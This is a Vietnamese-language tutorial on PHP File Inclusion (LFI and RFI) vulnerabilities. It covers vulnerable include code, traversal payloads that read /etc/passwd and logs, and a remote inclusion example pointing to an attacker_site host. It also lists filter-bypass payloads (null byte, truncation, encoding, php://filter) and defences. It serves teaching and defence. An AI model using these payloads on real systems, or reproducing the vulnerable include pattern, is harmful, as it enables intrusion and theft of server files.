# Lý thuyết
### 1. File inclusion là gì?
Lỗ hổng File Inclusion cho phép tin tặc truy cập trái phép vào những tập tin nhạy cảm trên máy chủ web hoặc thực thi các tệp tin độc hại bằng cách sử dụng chức năng “include”. 
### 2. Nguyên nhân
Lỗ hổng này xảy ra do trong code chứa các lệnh `include`, `require`, `include_once`, `require _ once` mà cơ chế kiểm tra đầu vào không được thực hiện tốt, khiến tin tặc có thể khai thác và chèn các dữ liệu độc hại.
#### Hàm 'Include'
Hàm `Include()` được sử dụng để nhập và thực thi nội dung của một tập tin PHP khác vào tập tin hiện tại. Phương thức này được sử dụng nhằm tránh việc code lặp và có thể sử dụng bất kì lúc nào. 
Toàn bộ nội dung trong một file cụ thể sẽ được sao chép vào một file khác chứa lời gọi ‘include’. Lập trình viên thường sử dụng hàm include() nhằm thêm những dữ liệu, tệp tin mã nguồn dùng chung của các tệp tin trong ứng dụng.

**Ví dụ:**
Có một file footer `footer.php` như sau:

```html=
<?php
echo "<p>Copyright &copy; 2023-" . date("Y") . " KCSC</p>";
?>
```
Phần footer này có thể được sử dụng lại trong tất cả các trang của ứng dụng bằng cách sử dụng hàm `Include()`, như file `home.php` sau:
```html=
<html>
<body>

<h1>Welcome to my home page!</h1>
<p>Some text.</p>
<p>Some more text.</p>
<?php include 'footer.php';?>

</body>
</html>
```
Ở đoạn mã trên, file `footer.php` đã được bao hàm trong file `home.php`. Lúc này, khi truy cập tới `home.php`, file `footer.php` cũng sẽ được sao chép và thực thi. 

### 3. LFI và RFI
#### 3.1. Local File Inclusion (LFI)
Lỗ hổng Local file inclusion nằm trong quá trình include file cục bộ có sẵn trên server. Lỗ hổng xảy ra khi đầu vào người dùng chứa đường dẫn đến file bắt buộc phải include.
Khi đầu vào này không được kiểm tra, tin tặc có thể sử dụng những tên file mặc định và truy cập trái phép đến chúng, tin tặc cũng có thể lợi dụng các thông tin trả về trên để đọc được những tệp tin nhạy cảm trên các thư mục khác nhau bằng cách chèn các ký tự đặc biệt như “/”, “../”, “-“.
Lỗi này xảy ra thường sẽ khiến website bị lộ các thông tin nhảy cảm như là `passwd`, `php.ini`, `access_log`,`config.php`…

**Ví dụ:**
1. Đường dẫn sau có thể bị tấn công LFI: 
    > https://victim_site/abc.php?file=userinput.txt
2. Giá trị của biến `file` được truyền vào đoạn mã php dưới đây:
    `<?php…include $_REQUEST['file'];…?>`
3. Tin tặc sẽ đưa mã độc vào biến `file` để truy cập trái phép vào file trong cùng chủ mục hoặc sử dụng kí tự duyệt chỉ mục như `../` để di chuyển đến chỉ mục khác. 
    Ví dụ tin tặc lấy được log bằng cách cung cấp đầu vào `/apache/logs/error.log` hoặc `/apache/logs/access.log` hay việc đánh cắp dữ liệu liên quan đến tài khoản của người dùng thông qua `../../etc/passw`d trên hệ thống Unix.

#### 3.2. Remote File Inclusion
RFI cho phép tin tặc include và thực thi trên máy chủ mục tiêu một tệp tin được lưu trữ từ xa. Tin tặc có thể sử dụng RFI để chạy một mã độc trên cả máy của người dùng và phía máy chủ. Ảnh hưởng của kiểu tấn công này thay đổi từ đánh cắp tạm thời session token hoặc các dữ liệu của người dùng cho đến việc tải lên các webshell, mã độc nhằm đến xâm hại hoàn toàn hệ thống máy chủ.

**Ví dụ:**
1. Đường dẫn sau có thể bị tấn công RFI:
    > https://www.victim_site.com/abc.php?testfile=example
2. Mã nguồn PHP chứa lỗ hổng
    `Include($_REQUEST['testfile'].'.php');`
3. Biến `testfile` được lấy từ phía người dùng. Đoạn mã trên lấy giá trị biến `testfile` và trực tiếp include nó vào file PHP hiện hành.
    Ví dụ về hướng tấn công:
`www.victim_site.com/abc.php?testfile=https://www.attacker_site.com/attack_page
`
    File `attack_page` được bao hàm vào trang có sẵn trên máy chủ và thực thi mỗi khi trang “abc.php” được truy cập. Tin tặc sẽ đưa mã độc vào “attack_page” và thực hiện hành vi độc hại.

### 4. Một số cách bypass

* Null Byte Injection
    Thêm ký tự null sau tên tệp giúp vô hiệu hoá phần extension `.php`.
    VD: `http://example.com/index.php?file=../../../etc/passwd%00
    `
* Path and dot truncation
    Hầu hết các phiên bản PHP giới hạn độ dài tên tệp là 4096 bytes. Nếu dài hơn, PHP sẽ cắt bớt phần vượt quá giới hạn. Kẻ tấn công có thể lợi dụng điều này để bỏ qua phần extension `.php`.
    VD: 
    ```
    http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]
    http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
    http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE] 
    http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd
    ```

* Encoding
    VD:
    ```
    http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
    http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
    ```

* Double encoding
    VD:
    ```
    http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
    http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
    ```

* PHP Wrappers
    * PHP Filter
    VD: 
    ```
    http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
    http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
    http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
    http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
    ```
    Ngoài ra còn có các loại wrappers khác như `PHP Zip`, `PHP Data`, `PHP Expect`.


### 5. Cách phòng chống File Inclusion
Lỗ hổng xảy ra khi việc kiểm tra đầu vào không được chú trọng. Khuyến cáo riêng thì không nên hoặc hạn chế tới mức tối thiểu phải sử dụng các biến từ “User Input” để đưa vào hàm include hay eval.  Trong trường hợp phải sử dụng. với các thông tin được nhập từ bên ngoài, trước khi đưa vào hàm cần được kiểm tra kỹ lưỡng.
1. Chỉ chấp nhận kí tự và số cho tên file (A-Z 0-9). Blacklist toàn bộ kí tự đặc biệt không được sử dụng.
2. Giới hạn API cho phép việc include file từ một chỉ mục xác định nhằm tránh directory traversal.
3. Sử dụng danh sách trắng cho các file extension được cho phép.
4. Set `allow_url_fopen` và `allow_url_include` thành off để giới hạn việc có thể gọi các tệp tin từ xa.